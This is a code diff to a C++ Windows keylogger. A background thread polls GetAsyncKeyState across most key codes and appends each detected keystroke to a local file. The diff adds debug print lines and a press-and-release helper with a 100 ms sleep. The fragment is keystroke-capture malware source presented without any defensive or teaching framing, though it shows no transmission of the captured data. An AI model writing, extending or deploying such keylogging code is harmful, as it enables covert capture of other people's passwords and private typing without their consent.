@@ -15,20 +15,34 @@ namespace logger
 
 	void write_file(char k)
 	{
+		std::cout << "writing to file\n";
 		std::ofstream outfile(path, std::ios::app);
 		outfile << k << "\n";
 		outfile.close();
 	}
 
+	bool IsKeyPressed(int keyCode) 
+	{
+		if (GetAsyncKeyState(keyCode) & isPressed) 
+		{
+			Sleep(100);
+
+			if (!(GetAsyncKeyState(keyCode) & isPressed)) 
+				return true;
+		}
+		return false;
+	}
+
 	void logger_subroutine()
 	{
+		std::cout << "thread entry\n";
 		while (thread_running)
 		{
 			for (int i = 8; i <= 222; i++)
 			{				
 				// bitwise & operator iterativaly checks if binary pair is found in
 				//the corresponding bits
-				if ((isPressed & GetAsyncKeyState(i)) != 0)
+				if (IsKeyPressed(i))
 				{
 					std::ofstream file(path, std::ios::app);
 
